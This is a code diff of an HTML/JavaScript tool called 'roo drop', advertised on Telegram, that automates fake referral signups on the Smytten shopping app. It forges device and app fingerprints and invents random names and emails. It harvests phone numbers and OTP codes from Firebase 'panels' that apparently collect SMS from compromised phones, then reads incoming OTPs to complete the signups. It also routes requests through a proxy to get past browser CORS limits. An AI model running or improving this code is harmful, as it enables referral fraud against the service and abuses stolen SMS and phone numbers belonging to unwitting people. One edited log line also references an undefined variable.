@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>roo drop — Smytten Auto Refer</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root{
   --bg:#0a0b14;--card:#14152a;--card2:#1a1b32;
@@ -11,15 +12,17 @@
   --txt:#f5f5ff;--dim:#8a8ba0;
   --ok:#22c55e;--err:#ef4444;--warn:#f59e0b;
 }
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter','Segoe UI',system-ui,sans-serif}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',sans-serif}
 body{background:radial-gradient(ellipse at top,#1a1030 0%,#0a0b14 60%);color:var(--txt);min-height:100vh;padding:24px}
 .wrap{max-width:1150px;margin:0 auto;display:grid;grid-template-columns:460px 1fr;gap:20px}
 @media(max-width:960px){.wrap{grid-template-columns:1fr}}
 .panel{background:var(--card);border:1px solid #2a2c4a;border-radius:16px;padding:22px}
-.logo{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.logo{display:flex;align-items:center;gap:12px;margin-bottom:18px;text-decoration:none;color:inherit}
 .logo-icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#c084fc,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 4px 20px rgba(139,92,246,.5)}
 .logo h1{font-size:22px;font-weight:800;letter-spacing:.3px}
 .logo small{color:var(--dim);font-size:12px;display:block;margin-top:1px}
+.tg-link{background:linear-gradient(135deg,#229ED9,#1c7fb0);color:#fff;border:none;border-radius:10px;padding:10px 14px;font-weight:700;font-size:12px;cursor:pointer;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;transition:.2s;margin-bottom:16px}
+.tg-link:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(34,158,217,.4)}
 .counter{background:var(--card2);border:1px solid #2a2c4a;border-radius:12px;padding:14px 16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
 .counter span{color:var(--dim);font-size:11px;letter-spacing:1.2px;font-weight:600}
 .counter b{font-size:28px;font-weight:800;background:linear-gradient(135deg,#c084fc,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
@@ -67,8 +70,6 @@ body{background:radial-gradient(ellipse at top,#1a1030 0%,#0a0b14 60%);color:var
 .hint code{background:rgba(139,92,246,.15);padding:1px 5px;border-radius:3px;color:var(--pur2)}
 .section-title{font-size:13px;font-weight:700;margin:16px 0 8px;color:var(--pur2);letter-spacing:.4px;display:flex;align-items:center;justify-content:space-between}
 .hidden{display:none!important}
-
-/* Firebase panel list */
 .fb-list{background:#05060f;border:1px solid #2a2c4a;border-radius:10px;padding:8px;margin-top:8px;max-height:180px;overflow-y:auto;font-size:12px}
 .fb-item{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:8px 10px;border-bottom:1px solid #1a1b32;border-radius:6px;transition:.15s}
 .fb-item:last-child{border-bottom:none}
@@ -81,8 +82,6 @@ body{background:radial-gradient(ellipse at top,#1a1030 0%,#0a0b14 60%);color:var
 .fb-item .fb-del{background:rgba(239,68,68,.15);color:var(--err);border:none;width:24px;height:24px;border-radius:6px;cursor:pointer;font-size:14px;line-height:1;font-weight:700;flex-shrink:0}
 .fb-item .fb-del:hover{background:rgba(239,68,68,.3)}
 .fb-empty{color:var(--dim);text-align:center;padding:14px;font-style:italic}
-
-/* Device list */
 .devices-list{background:#05060f;border:1px solid #2a2c4a;border-radius:10px;padding:10px;margin-top:10px;max-height:180px;overflow-y:auto;font-size:11.5px;font-family:monospace}
 .dev-item{display:flex;gap:6px;align-items:center;padding:5px 4px;border-bottom:1px solid #1a1b32}
 .dev-item:last-child{border-bottom:none}
@@ -90,20 +89,22 @@ body{background:radial-gradient(ellipse at top,#1a1030 0%,#0a0b14 60%);color:var
 .dev-item .ph.used{color:var(--err);text-decoration:line-through}
 .dev-item .src{color:var(--pur2);font-size:10.5px;opacity:.7;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
 .dev-item .busy{color:var(--warn);font-size:10px;font-weight:700}
-
 .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle}
 @keyframes spin{to{transform:rotate(360deg)}}
-.scan-summary{font-size:11px;color:var(--dim);margin-top:6px;line-height:1.6}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <!-- LEFT PANEL -->
   <div class="panel">
-    <div class="logo">
+    <a href="https://t.me/roodrop" target="_blank" class="logo">
       <div class="logo-icon">🛍️</div>
       <div><h1>roo drop</h1><small>Smytten Auto Refer — Client Side</small></div>
-    </div>
+    </a>
+    
+    <a href="https://t.me/roodrop" target="_blank" class="tg-link">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+      Join Telegram Channel @roodrop
+    </a>
 
     <div class="counter">
       <span>TOTAL REFER COUNT</span>
@@ -169,7 +170,7 @@ https://xxx.firebasedatabase.app/"></textarea>
       <div class="devices-list" id="fbDevices"><div class="fb-empty">Scan to load devices</div></div>
 
       <div class="hint">
-        🔥 Multi-panel: har line ek panel. Har panel se phones extract hote hain. Pool empty → saare panels rescan. Airplane pause between attempts.
+        🔥 Multi-panel: har line ek panel. Pool empty → saare panels rescan. Airplane pause between attempts.
       </div>
     </div>
 
@@ -181,14 +182,16 @@ https://xxx.firebasedatabase.app/"></textarea>
       </div>
       <div class="field">
         <label>Referral Code</label>
-        <input type="text" id="refInput" value="0rqjgq7" placeholder="0rqjgq7">
+        <input type="text" id="refInput" value="ugbO7ND" placeholder="ugbO7ND">
       </div>
       <div class="field hidden" id="otpField">
-        <label>OTP Received</label>
+        <label>OTP Received (SMS)</label>
         <div class="otp-row" id="otpRow"></div>
+        <div style="font-size:11px;color:var(--dim);margin-top:6px">SMS check karo — 4 ya 6 digit OTP daalo</div>
       </div>
       <button class="btn btn-start" id="btnSendOtp" onclick="sendOtp()">📤 Send OTP</button>
       <button class="btn btn-otp hidden" id="btnVerify" onclick="verifyOtp()">✓ Verify OTP &amp; Apply Refer</button>
+      <button class="btn btn-stop hidden" id="btnResetOtp" onclick="resetManual()">↺ Reset / New Number</button>
       <div class="hint">
         📲 Manual: phone daalo → OTP aayega SMS pe → enter OTP → profile update + refer apply ho jaayega.
       </div>
@@ -200,7 +203,6 @@ https://xxx.firebasedatabase.app/"></textarea>
     </div>
   </div>
 
-  <!-- RIGHT: LOG -->
   <div class="panel">
     <div class="logo" style="margin-bottom:12px">
       <div class="logo-icon" style="width:32px;height:32px;font-size:16px">⚡</div>
@@ -211,9 +213,12 @@ https://xxx.firebasedatabase.app/"></textarea>
 </div>
 
 <script>
-/* ================= CONSTANTS (from sym.py) ================= */
-const BASE = "https://route.smytten.com";
-const DEFAULT_REF = "0rqjgq7";
+/* ================= CONSTANTS ================= */
+// 👇 YAHAN APNA CLOUDFLARE WORKER URL DAALEIN 👇
+const BASE = "https://smytten-proxy.yourname.workers.dev"; 
+// (Agar worker nahi banaya hai, toh abhi ke liye "https://route.smytten.com" rakhein)
+
+const DEFAULT_REF = "ugbO7ND";
 const OTP_TIMEOUT_MS = 100000;
 const OTP_POLL_MS = 1500;
 
@@ -225,9 +230,8 @@ let userId = null;
 let currentPhone = null;
 let otpBoxes = [];
 
-// Multi-panel state
-let panels = []; // [{ url, status, devices: [] }]
-let fbDevices = []; // { client_id, phone, firebase_url, panelIndex }
+let panels = [];
+let fbDevices = [];
 let fbUsedPhones = new Set();
 let fbAutoRunning = false;
 
@@ -270,7 +274,19 @@ function buildOtpBoxes(){
     const b = document.createElement('input');
     b.className = 'otp-box'; b.maxLength = 1; b.type = 'text'; b.inputMode = 'numeric';
     b.oninput = e => { if(e.target.value && otpBoxes[i+1]) otpBoxes[i+1].focus(); };
-    b.onkeydown = e => { if(e.key === 'Backspace' && !e.target.value && otpBoxes[i-1]) otpBoxes[i-1].focus(); };
+    b.onkeydown = e => {
+      if(e.key === 'Backspace' && !e.target.value && otpBoxes[i-1]) otpBoxes[i-1].focus();
+      if(e.key === 'Enter') verifyOtp();
+    };
+    b.onpaste = e => {
+      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
+      if(paste.length >= 4){
+        e.preventDefault();
+        for(let j=0; j<6; j++) otpBoxes[j].value = paste[j] || '';
+        const focusIdx = Math.min(paste.length, 5);
+        otpBoxes[focusIdx].focus();
+      }
+    };
     row.appendChild(b); otpBoxes.push(b);
   }
 }
@@ -280,25 +296,16 @@ function getOtp(){ return otpBoxes.map(b => b.value).join(''); }
 function normalizePanel(link){
   link = (link || '').trim();
   if(!link) return null;
-
-  // remove quotes
   link = link.replace(/^["']|["']$/g, '').trim();
   if(!link) return null;
-
-  // auto-add https:// if it's a firebase domain but no protocol
   if(!/^https?:\/\//i.test(link)){
     if(/firebaseio\.com|firebasedatabase\.app/i.test(link)){
       link = 'https://' + link;
     }
   }
-
-  // direct firebase domain URL
-  if(/^https?:\/\/[^/]*firebaseio\.com/i.test(link) ||
-     /^https?:\/\/[^/]*firebasedatabase\.app/i.test(link)){
+  if(/^https?:\/\/[^/]*firebaseio\.com/i.test(link) || /^https?:\/\/[^/]*firebasedatabase\.app/i.test(link)){
     return link.endsWith('/') ? link : link + '/';
   }
-
-  // panel link with ?s= param
   const m = link.match(/[?&]s=([A-Za-z0-9+/=_\-]+)/);
   if(m){
     try{
@@ -321,7 +328,6 @@ function renderPanels(){
   const badge = document.getElementById('fbCountBadge');
   badge.textContent = panels.length;
   badge.className = 'badge ' + (panels.length ? 'ok' : 'pending');
-
   if(!panels.length){
     list.innerHTML = '<div class="fb-empty">No panels added yet</div>';
     return;
@@ -329,7 +335,6 @@ function renderPanels(){
   list.innerHTML = panels.map((p, i) => {
     const statusCls = p.status === 'ok' ? 'ok' : (p.status === 'err' ? 'err' : 'pending');
     const statusText = p.status === 'ok' ? `${p.devices.length} dev` : (p.status === 'err' ? 'ERROR' : 'pending');
-    // Short display URL
     let shortUrl = p.url.replace(/^https?:\/\//, '').replace(/\/$/, '');
     if(shortUrl.length > 38) shortUrl = shortUrl.slice(0, 35) + '…';
     return `<div class="fb-item">
@@ -344,7 +349,6 @@ function addPanels(){
   const raw = document.getElementById('fbInput').value;
   const lines = raw.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
   if(!lines.length){ log('✗ Paste at least one Firebase URL','err'); return; }
-
   let added = 0, dup = 0, invalid = 0;
   for(const line of lines){
     const norm = normalizePanel(line);
@@ -353,14 +357,10 @@ function addPanels(){
       invalid++;
       continue;
     }
-    if(panels.some(p => p.url === norm)){
-      dup++;
-      continue;
-    }
+    if(panels.some(p => p.url === norm)){ dup++; continue; }
     panels.push({ url: norm, status: 'pending', devices: [] });
     added++;
   }
-
   document.getElementById('fbInput').value = '';
   renderPanels();
   log(`✓ Added ${added} panel(s) | ${dup} duplicate | ${invalid} invalid`, added ? 'ok' : 'warn');
@@ -369,7 +369,6 @@ function addPanels(){
 function removePanel(idx){
   if(fbAutoRunning){ log('⚠ Cannot remove panel while running','warn'); return; }
   const removed = panels.splice(idx, 1);
-  // Remove devices from this panel
   if(removed.length){
     const url = removed[0].url;
     fbDevices = fbDevices.filter(d => d.firebase_url !== url);
@@ -381,11 +380,8 @@ function removePanel(idx){
 
 function clearPanels(){
   if(fbAutoRunning){ log('⚠ Cannot clear panels while running','warn'); return; }
-  panels = [];
-  fbDevices = [];
-  fbUsedPhones.clear();
-  renderPanels();
-  renderDevices();
+  panels = []; fbDevices = []; fbUsedPhones.clear();
+  renderPanels(); renderDevices();
   log('🗑 Cleared all panels + devices','sys');
 }
 
@@ -396,7 +392,6 @@ function renderDevices(){
   const available = fbDevices.filter(d => d.phone && !fbUsedPhones.has(d.phone)).length;
   badge.textContent = available;
   badge.className = 'badge ' + (available ? 'ok' : 'pending');
-
   if(!fbDevices.length){
     box.innerHTML = '<div class="fb-empty">Scan to load devices</div>';
     return;
@@ -412,16 +407,9 @@ function renderDevices(){
   }).join('');
 }
 
-/* ================= PAYLOAD BUILDERS (from sym.py) ================= */
-function randomDeviceId(){
-  return Array.from({length:16}, () => Math.floor(Math.random()*16).toString(16)).join('');
-}
-function randomAdId(){
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
-    const r = Math.random()*16|0;
-    return (c==='x' ? r : (r&0x3|0x8)).toString(16);
-  });
-}
+/* ================= PAYLOAD BUILDERS ================= */
+function randomDeviceId(){ return Array.from({length:16}, () => Math.floor(Math.random()*16).toString(16)).join(''); }
+function randomAdId(){ return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { const r = Math.random()*16|0; return (c==='x' ? r : (r&0x3|0x8)).toString(16); }); }
 function randomName(){
   const f = ["Rahul","Amit","Rohit","Vikas","Suresh","Ravi","Ankit","Nikhil","Saurabh","Deepak","Manish","Pankaj","Gaurav","Nitin","Ajay"];
   const l = ["Sharma","Verma","Yadav","Singh","Kumar","Patel","Gupta","Jain","Mehta","Chauhan"];
@@ -435,15 +423,10 @@ function randomAlnum(len){
 }
 function makeHeaders(session_id=null, user_type=""){
   const h = {
-    "gender": "male",
-    "app_version": "228",
-    "app_platform": "android",
-    "last_app_open": String(Date.now()),
-    "user_type": user_type || "",
+    "gender": "male", "app_version": "228", "app_platform": "android",
+    "last_app_open": String(Date.now()), "user_type": user_type || "",
     "Content-Type": "application/json; charset=UTF-8",
-    "User-Agent": "okhttp/4.10.0",
-    "Accept-Encoding": "gzip",
-    "Connection": "Keep-Alive"
+    "Accept-Encoding": "gzip", "Connection": "Keep-Alive"
   };
   if(session_id) h["session_id"] = session_id;
   return h;
@@ -451,28 +434,12 @@ function makeHeaders(session_id=null, user_type=""){
 function makeDevicePayload(phoneNum){
   const hex = Array.from({length:22}, () => Math.floor(Math.random()*16).toString(16)).join('');
   return {
-    "app_installer": "com.android.vending",
-    "device_id": randomDeviceId(),
-    "app_version": "10.2.8",
-    "recaptcha_token": "",
-    "app_signature": "",
-    "guest_user_access": true,
-    "ad_id": randomAdId(),
-    "device_info": {
-      "version_code": "12",
-      "model": "SM-S9260",
-      "incremental": "465",
-      "display_ui": "V417IR",
-      "brand": "Samsung"
-    },
-    "device_token": `${hex}:APA91b${randomAlnum(120)}`,
-    "package_name": "com.app.smytten",
-    "device_platform": "android",
-    "app_path": "/data/user/0/com.app.smytten/files",
-    "pincode_details": {
-      "Answer": "Your IP address is 122.162.149.39 in New Delhi, India (110029)",
-      "AnswerType": "ip"
-    },
+    "app_installer": "com.android.vending", "device_id": randomDeviceId(), "app_version": "10.2.8",
+    "recaptcha_token": "", "app_signature": "", "guest_user_access": true, "ad_id": randomAdId(),
+    "device_info": { "version_code": "12", "model": "SM-S9260", "incremental": "465", "display_ui": "V417IR", "brand": "Samsung" },
+    "device_token": `${hex}:APA91b${randomAlnum(120)}`, "package_name": "com.app.smytten",
+    "device_platform": "android", "app_path": "/data/user/0/com.app.smytten/files",
+    "pincode_details": { "Answer": "Your IP address is 122.162.149.39 in New Delhi, India (110029)", "AnswerType": "ip" },
     "value": String(phoneNum)
   };
 }
@@ -480,19 +447,26 @@ function makeDevicePayload(phoneNum){
 /* ================= API CALLS ================= */
 async function apiPost(path, body, headers={}, method='POST'){
   const url = BASE + path;
-  try{
+  try {
     const res = await fetch(url, {
-      method,
-      headers: {...headers, "Host": "route.smytten.com"},
+      method: method,
+      headers: headers,
       body: JSON.stringify(body)
     });
-    const text = await res.text();
+    let text = '';
+    try { text = await res.text(); } catch(e){}
     let data = null;
     try { data = JSON.parse(text); } catch(e){}
-    return { ok: res.status < 400, status: res.status, data, text };
+    return {
+      ok: res.status < 400,
+      status: res.status,
+      data,
+      text,
+      opaque: res.type === 'opaque' || (!text && res.status !== 200)
+    };
   } catch(e){
-    log(`✗ ${path} failed: ${e.message}`, 'err');
-    return { ok: false, error: e.message, data: null };
+    log(`✗ ${path} network fail: ${e.message}`, 'err');
+    return { ok: false, error: e.message, data: null, text: '', opaque: true, status: 0 };
   }
 }
 
@@ -501,41 +475,51 @@ async function sendOtp(){
   const phoneIn = document.getElementById('phoneInput').value.trim();
   if(!/^\d{10}$/.test(phoneIn)){ log('Invalid phone — 10 digits required','err'); return; }
   currentPhone = phoneIn;
-  const ref = document.getElementById('refInput').value.trim() || DEFAULT_REF;
+
   log(`📱 Sending OTP to +91${currentPhone} …`);
   setStatus('Sending OTP','pending');
+
   const r = await apiPost('/discover_user/users/loginViaNumberV2', makeDevicePayload(currentPhone), makeHeaders());
 
   let isNew = null, msg = '';
   if(r.data){
     const content = r.data.content || {};
-    isNew = content.is_new_user ?? content.newUser ?? null;
-    msg = r.data.response?.message || '';
-    log(`✓ API Response | is_new_user=${isNew} | ${msg}`, 'info');
+    isNew = content.is_new_user ?? content.newUser ?? r.data.is_new_user ?? r.data.newUser;
+    msg = r.data.response?.message || r.data.message || '';
+    log(`✓ Response | is_new_user=${isNew} | ${msg || '—'}`, 'info');
+  } else if(r.opaque){
+    log('⚠ Opaque/CORS response — cannot read body, but OTP likely sent', 'warn');
+    log('  → Make sure you have added your Cloudflare Worker URL in the code!', 'sys');
   } else {
-    log(`⚠ Response not JSON (status ${r.status})`, 'warn');
+    log(`⚠ Response not JSON (HTTP ${r.status})`, 'warn');
+    log(`  Raw: ${(r.text || '').slice(0, 160)}`, 'sys');
   }
 
   if(isNew === false){
-    log(`✗ +91${currentPhone} already registered — try another`, 'err');
-    setStatus('Already Exists','blocked');
-    return;
+    log(`⚠ +91${currentPhone} appears already registered`, 'warn');
+  } else if(isNew === true){
+    log(`✓ New user confirmed — OTP sent to +91${currentPhone}`, 'ok');
+  } else {
+    log(`✓ OTP request dispatched — check SMS on +91${currentPhone}`, 'ok');
   }
 
-  log(`✓ OTP sent to +91${currentPhone}`, 'ok');
   document.getElementById('otpField').classList.remove('hidden');
   document.getElementById('btnVerify').classList.remove('hidden');
+  document.getElementById('btnResetOtp').classList.remove('hidden');
   document.getElementById('btnSendOtp').classList.add('hidden');
   buildOtpBoxes();
-  otpBoxes[0].focus();
+  setTimeout(() => {
+    otpBoxes[0]?.focus();
+    document.getElementById('otpField').scrollIntoView({behavior:'smooth', block:'center'});
+  }, 100);
   setStatus('Awaiting OTP','pending');
 }
 
 async function verifyOtp(){
   const otp = getOtp();
-  if(otp.length < 4){ log('Enter the OTP received','warn'); return; }
+  if(otp.length < 4){ log('Enter the OTP received from SMS','warn'); return; }
   const ref = document.getElementById('refInput').value.trim() || DEFAULT_REF;
-  log(`🔐 Verifying OTP ${otp} …`);
+  log(`🔐 Verifying OTP ${otp} for +91${currentPhone} …`);
   setStatus('Verifying','pending');
 
   const payload = makeDevicePayload(currentPhone);
@@ -544,13 +528,23 @@ async function verifyOtp(){
   payload.is_mini = false;
 
   const r = await apiPost('/discover_user/users/verifyLoginOtpV2', payload, makeHeaders());
+
   if(!r.data){
-    log('✗ Verify failed — no JSON', 'err');
-    setStatus('Verify Failed','blocked');
+    if(r.opaque){
+      log(`⚠ Opaque/CORS-blocked verify response`, 'warn');
+      log(`  → Make sure you have added your Cloudflare Worker URL in the code!`, 'sys');
+      setStatus('Verify Unverified','pending');
+    } else {
+      log(`✗ Verify failed — HTTP ${r.status}`, 'err');
+      if(r.text) log(`  Raw: ${r.text.slice(0, 200)}`, 'sys');
+      setStatus('Verify Failed','blocked');
+    }
     return;
   }
+
   if(r.data.response?.error !== 0){
-    log(`✗ Verify failed: ${r.data.response?.message || 'unknown'}`, 'err');
+    const em = r.data.response?.message || 'unknown';
+    log(`✗ Verify failed: ${em}`, 'err');
     setStatus('Verify Failed','blocked');
     return;
   }
@@ -558,10 +552,10 @@ async function verifyOtp(){
   const content = r.data.content || {};
   sessionId = content.session_id || content.authentication?.session_id;
   userId = content.id;
-  log(`✓ Verified | Session: ${sessionId ? sessionId.slice(0,14)+'…' : '?'}`, 'ok');
+  log(`✓ Verified | Session: ${sessionId ? session_id.slice(0,14)+'…' : '?'}`, 'ok');
 
   if(!sessionId){
-    log('✗ Session ID missing in verify response', 'err');
+    log('✗ Session ID missing in verify response — cannot proceed', 'err');
     setStatus('Failed','blocked');
     return;
   }
@@ -574,13 +568,8 @@ async function verifyOtp(){
   log(`👤 Profile → ${first} ${last} | ${email}`);
 
   const putPayload = {
-    "pincode": "110029",
-    "gender": "male",
-    "birth_month": Math.floor(Math.random()*12)+1,
-    "name": first.toUpperCase(),
-    "email": email,
-    "birth_year": String(1996 + Math.floor(Math.random()*8)),
-    "invite_code": ref
+    "pincode": "110029", "gender": "male", "birth_month": Math.floor(Math.random()*12)+1,
+    "name": first.toUpperCase(), "email": email, "birth_year": String(1996 + Math.floor(Math.random()*8)), "invite_code": ref
   };
   const pr = await apiPost('/discover_user/app/users/update_profile', putPayload, makeHeaders(sessionId, "18"), 'PUT');
 
@@ -590,75 +579,51 @@ async function verifyOtp(){
     setStatus('Success','ok');
   } else {
     log(`⚠ Profile update may have failed (HTTP ${pr.status})`, 'warn');
+    if(pr.opaque) log(`  → Opaque response; server may still have accepted.`, 'sys');
     setStatus('Profile Fail','blocked');
   }
 
+  resetManual(true);
+}
+
+function resetManual(silent=false){
   document.getElementById('btnVerify').classList.add('hidden');
+  document.getElementById('btnResetOtp').classList.add('hidden');
   document.getElementById('btnSendOtp').classList.remove('hidden');
   document.getElementById('otpField').classList.add('hidden');
   document.getElementById('phoneInput').value = '';
+  document.getElementById('otpRow').innerHTML = '';
+  otpBoxes = [];
+  currentPhone = null;
+  sessionId = null;
+  if(!silent){ log('↺ Reset — enter new number to continue','sys'); setStatus('Idle','pending'); }
 }
 
-/* ================= FIREBASE — PHONE EXTRACTION ================= */
+/* ================= FIREBASE AUTO FLOW ================= */
 function extractPhone(msgs){
   if(!msgs || typeof msgs !== 'object') return null;
-  const pats = [
-    /\b(?:\+91|91|0)?([6-9]\d{9})\b/g,
-    /\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b/gi,
-    /[^0-9]([6-9]\d{9})[^0-9]/g
-  ];
+  const pats = [/\b(?:\+91|91|0)?([6-9]\d{9})\b/g, /\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b/gi, /[^0-9]([6-9]\d{9})[^0-9]/g];
   const counts = {};
   Object.values(msgs).forEach(m => {
     if(!m || typeof m !== 'object') return;
     const t = String(m.body || m.message || m.text || '');
-    pats.forEach(p => {
-      let mm;
-      while((mm = p.exec(t)) !== null){
-        const num = mm[1];
-        counts[num] = (counts[num]||0) + 1;
-      }
-    });
+    pats.forEach(p => { let mm; while((mm = p.exec(t)) !== null){ counts[mm[1]] = (counts[mm[1]]||0) + 1; } });
   });
   const sorted = Object.entries(counts).sort((a,b)=>b[1]-a[1]);
   return sorted.length ? sorted[0][0] : null;
 }
 
-/* ================= SCAN ONE PANEL ================= */
 async function scanOnePanel(panel){
   const url = panel.url;
   try{
-    // root test
     const rootTest = await fetch(url + '.json?shallow=true');
-    if(!rootTest.ok){
-      panel.status = 'err';
-      log(`✗ ${shortUrl(url)} | Root HTTP ${rootTest.status}`, 'err');
-      return [];
-    }
-
-    // clients.json
+    if(!rootTest.ok){ panel.status = 'err'; log(`✗ ${shortUrl(url)} | Root HTTP ${rootTest.status}`, 'err'); return []; }
     const r = await fetch(url + 'clients.json');
-    if(!r.ok){
-      panel.status = 'err';
-      log(`✗ ${shortUrl(url)} | clients.json HTTP ${r.status}`, 'err');
-      if(r.status === 404) log(`  → No "clients" node at this DB root`, 'sys');
-      return [];
-    }
-
+    if(!r.ok){ panel.status = 'err'; log(`✗ ${shortUrl(url)} | clients.json HTTP ${r.status}`, 'err'); return []; }
     const clients = await r.json();
-    if(!clients || typeof clients !== 'object'){
-      panel.status = 'err';
-      log(`✗ ${shortUrl(url)} | empty clients`, 'err');
-      return [];
-    }
-
+    if(!clients || typeof clients !== 'object'){ panel.status = 'err'; log(`✗ ${shortUrl(url)} | empty clients`, 'err'); return []; }
     const online = Object.entries(clients).filter(([k,v]) => v && v.status);
-    if(!online.length){
-      panel.status = 'ok';
-      log(`⚠ ${shortUrl(url)} | 0 online devices`, 'warn');
-      return [];
-    }
-
-    // extract phones (batch)
+    if(!online.length){ panel.status = 'ok'; log(`⚠ ${shortUrl(url)} | 0 online devices`, 'warn'); return []; }
     const devices = [];
     const seen = new Set();
     for(let i=0; i<online.length; i+=10){
@@ -673,81 +638,50 @@ async function scanOnePanel(panel){
         }catch(e){}
         return null;
       }));
-      for(const d of settled){
-        if(d && !seen.has(d.phone)){ seen.add(d.phone); devices.push(d); }
-      }
+      for(const d of settled){ if(d && !seen.has(d.phone)){ seen.add(d.phone); devices.push(d); } }
     }
-
-    panel.status = 'ok';
-    panel.devices = devices;
+    panel.status = 'ok'; panel.devices = devices;
     log(`✓ ${shortUrl(url)} | ${online.length} online | ${devices.length} phone(s)`, 'ok');
     return devices;
-
-  }catch(e){
-    panel.status = 'err';
-    log(`✗ ${shortUrl(url)} | ${e.message}`, 'err');
-    return [];
-  }
+  }catch(e){ panel.status = 'err'; log(`✗ ${shortUrl(url)} | ${e.message}`, 'err'); return []; }
 }
 
-function shortUrl(url){
-  return url.replace(/^https?:\/\//, '').replace(/\/$/, '').split('.')[0];
-}
+function shortUrl(url){ return url.replace(/^https?:\/\//, '').replace(/\/$/, '').split('.')[0]; }
 
-/* ================= SCAN ALL PANELS ================= */
 async function scanAllPanels(){
   if(!panels.length){ log('✗ Add Firebase panel(s) first','err'); return; }
   if(fbAutoRunning){ log('⚠ Already running','warn'); return; }
+  log(`🔍 Scanning ${panels.length} panel(s)…`, 'info'); setStatus('Scanning','pending');
 
-  log(`🔍 Scanning ${panels.length} panel(s)…`, 'info');
-  setStatus('Scanning','pending');
-
-  // Reset per-panel devices but keep existing fbDevices if they're still valid
-  fbDevices = fbDevices.filter(d => {
-    const p = panels.find(pp => pp.url === d.firebase_url);
-    return p && !fbUsedPhones.has(d.phone);
-  });
+  fbDevices = fbDevices.filter(d => { const p = panels.find(pp => pp.url === d.firebase_url); return p && !fbUsedPhones.has(d.phone); });
 
   for(const p of panels){
     if(p.status === 'ok' && p.devices.length && p.devices.some(d => !fbUsedPhones.has(d.phone))){
-      // Already have devices from previous scan — merge into pool
       for(const d of p.devices){
-        if(!fbUsedPhones.has(d.phone) && !fbDevices.some(x => x.phone === d.phone && x.firebase_url === d.firebase_url)){
-          fbDevices.push(d);
-        }
+        if(!fbUsedPhones.has(d.phone) && !fbDevices.some(x => x.phone === d.phone && x.firebase_url === d.firebase_url)) fbDevices.push(d);
       }
     }
-    // Re-scan if no valid devices
     if(!p.devices.length || p.status !== 'ok'){
       const fresh = await scanOnePanel(p);
       for(const d of fresh){
-        if(!fbDevices.some(x => x.phone === d.phone && x.firebase_url === d.firebase_url)){
-          fbDevices.push(d);
-        }
+        if(!fbDevices.some(x => x.phone === d.phone && x.firebase_url === d.firebase_url)) fbDevices.push(d);
       }
     }
     renderPanels();
   }
-
   renderDevices();
   const total = fbDevices.filter(d => !fbUsedPhones.has(d.phone)).length;
-  log(`✅ Scan done — ${total} device(s) available across ${panels.length} panel(s)`, total ? 'ok' : 'warn');
+  log(`✅ Scan done — ${total} device(s) available`, total ? 'ok' : 'warn');
   setStatus(total ? 'Ready' : 'No Devices', total ? 'ok' : 'blocked');
 }
 
-/* ================= AUTO REFRESH POOL ================= */
 async function refreshPoolIfNeeded(){
   const available = fbDevices.filter(d => d.phone && !fbUsedPhones.has(d.phone) && !d._busy);
   if(available.length) return available.length;
-
-  log('🔄 Pool empty — rescanning all panels…', 'warn');
-  const oldCount = fbDevices.length;
-  await scanAllPanels();
-  const newCount = fbDevices.filter(d => !fbUsedPhones.has(d.phone)).length;
-  return newCount;
+  log('🔄 Pool empty — rescanning all panels…', 'warn'); await scanAllPanels();
+  return fbDevices.filter(d => !fbUsedPhones.has(d.phone)).length;
 }
 
-/* ================= FETCH OTP FROM FIREBASE ================= */
 async function fetchOtpFromFirebase(firebaseUrl, clientId, triggerMs){
   const start = Date.now();
   while(Date.now() - start < OTP_TIMEOUT_MS){
@@ -764,14 +698,10 @@ async function fetchOtpFromFirebase(firebaseUrl, clientId, triggerMs){
             const m = msgs[mid];
             if(!m || typeof m !== 'object') continue;
             const body = String(m.body || m.message || m.text || '');
-            let mm = body.match(/(\d{4,6})\s+is your.*?(?:verification|otp|code)/i);
-            if(mm) return mm[1];
-            mm = body.match(/(?:otp|code)[:\s]*(\d{4,6})/i);
-            if(mm) return mm[1];
-            mm = body.match(/(?<!\d)(\d{6})(?!\d)/);
-            if(mm) return mm[1];
-            mm = body.match(/(?<!\d)(\d{4})(?!\d)/);
-            if(mm) return mm[1];
